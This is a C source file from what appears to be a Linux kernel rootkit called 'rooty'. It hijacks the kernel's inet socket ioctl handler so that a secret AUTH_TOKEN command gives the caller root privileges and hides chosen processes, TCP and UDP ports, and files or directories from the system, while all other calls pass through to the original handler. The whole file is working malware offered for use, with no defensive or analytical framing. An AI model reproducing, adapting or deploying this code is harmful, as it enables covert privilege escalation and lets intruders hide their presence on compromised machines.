#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/net.h>
#include <linux/limits.h>
#include <asm/uaccess.h>

#include "../include/ioctl_handler.h"
#include "../include/syscall_table.h"
#include "../include/proc_fs_hide.h"
#include "../include/socket_hide.h"
#include "../include/vnc.h"
#include "../common/rooty_uapi.h"

int (*inet_ioctl)(struct socket *, unsigned int, unsigned long);

void *get_inet_ioctl(int family, int type, int protocol)
{
    void *ret;
    struct socket *sock = NULL;

    if (sock_create(family, type, protocol, &sock))
        return NULL;

    ret = sock->ops->ioctl;

    sock_release(sock);

    return ret;
}

long n_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg)
{
    int ret;
    struct rooty_args args;

    if (cmd == AUTH_TOKEN) {
        ret = copy_from_user(&args, (void *)arg, sizeof(args));
        if (ret)
            return -EFAULT;

        switch (args.cmd) {
        case 0:
            root_me();
            break;

        case 1:
        {
            struct rooty_proc_args proc_args;
            ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
            if (ret)
                return -EFAULT;
            printk("rooty: IOCTL->Hiding PID %d\n", proc_args.pid);
            hide_proc(proc_args.pid);
        }
        break;

        case 2:
        {
            struct rooty_proc_args proc_args;
            ret = copy_from_user(&proc_args, args.ptr, sizeof(proc_args));
            if (ret)
                return -EFAULT;
            printk("rooty: IOCTL->Unhiding PID %d\n", proc_args.pid);
            unhide_proc(proc_args.pid);
        }
        break;

        case 3:
        {
            struct rooty_port_args port_args;
            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
                return -EFAULT;
            printk("rooty: IOCTL->Hiding TCPv4 port %hu\n", port_args.port);
            hide_tcp4_port(port_args.port);
        }
        break;

        case 4:
        {
            struct rooty_port_args port_args;
            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
                return -EFAULT;
            printk("rooty: IOCTL->Unhiding TCPv4 port %hu\n", port_args.port);
            unhide_tcp4_port(port_args.port);
        }
        break;

        case 5:
        {
            struct rooty_port_args port_args;
            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
                return -EFAULT;
            printk("rooty: IOCTL->Hiding TCPv6 port %hu\n", port_args.port);
            hide_tcp6_port(port_args.port);
        }
        break;

        case 6:
        {
            struct rooty_port_args port_args;
            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
                return -EFAULT;
            printk("rooty: IOCTL->Unhiding TCPv6 port %hu\n", port_args.port);
            unhide_tcp6_port(port_args.port);
        }
        break;

        case 7:
        {
            struct rooty_port_args port_args;
            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
                return -EFAULT;
            printk("rooty: IOCTL->Hiding UDPv4 port %hu\n", port_args.port);
            hide_udp4_port(port_args.port);
        }
        break;

        case 8:
        {
            struct rooty_port_args port_args;
            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
                return -EFAULT;
            printk("rooty: IOCTL->Unhiding UDPv4 port %hu\n", port_args.port);
            unhide_udp4_port(port_args.port);
        }
        break;

        case 9:
        {
            struct rooty_port_args port_args;
            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
                return -EFAULT;
            printk("rooty: IOCTL->Hiding UDPv6 port %hu\n", port_args.port);
            hide_udp6_port(port_args.port);
        }
        break;

        case 10:
        {
            struct rooty_port_args port_args;
            ret = copy_from_user(&port_args, args.ptr, sizeof(port_args));
            if (ret)
                return -EFAULT;
            printk("rooty: IOCTL->Unhiding UDPv6 port %hu\n", port_args.port);
            unhide_udp6_port(port_args.port);
        }
        break;

        case 11:
        {
            char *name;
            struct rooty_file_args file_args;
            ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
            if (ret)
                return -EFAULT;
            if (file_args.namelen > NAME_MAX)
                return -EINVAL;
            name = kmalloc(file_args.namelen + 1, GFP_KERNEL);
            if (!name)
                return -ENOMEM;
            ret = copy_from_user(name, file_args.name, file_args.namelen);
            if (ret) {
                kfree(name);
                return -EFAULT;
            }
            name[file_args.namelen] = 0;
            printk("rooty: IOCTL->Hiding file/dir %s\n", name);
            hide_file(name);
        }
        break;

        case 12:
        {
            char *name;
            struct rooty_file_args file_args;
            ret = copy_from_user(&file_args, args.ptr, sizeof(file_args));
            if (ret)
                return -EFAULT;
            if (file_args.namelen > NAME_MAX)
                return -EINVAL;
            name = kmalloc(file_args.namelen + 1, GFP_KERNEL);
            if (!name)
                return -ENOMEM;
            ret = copy_from_user(name, file_args.name, file_args.namelen);
            if (ret) {
                kfree(name);
                return -EFAULT;
            }
            name[file_args.namelen] = 0;
            printk("rooty: IOCTL->Unhiding file/dir %s\n", name);
            unhide_file(name);
            kfree(name);
        }
        break;

        default:
            printk("rooty: IOCTL->Unknown command");
            break;
        }
        return 0;
    }

    hijack_pause(inet_ioctl);
    ret = inet_ioctl(sock, cmd, arg);
    hijack_resume(inet_ioctl);

    return ret;
}
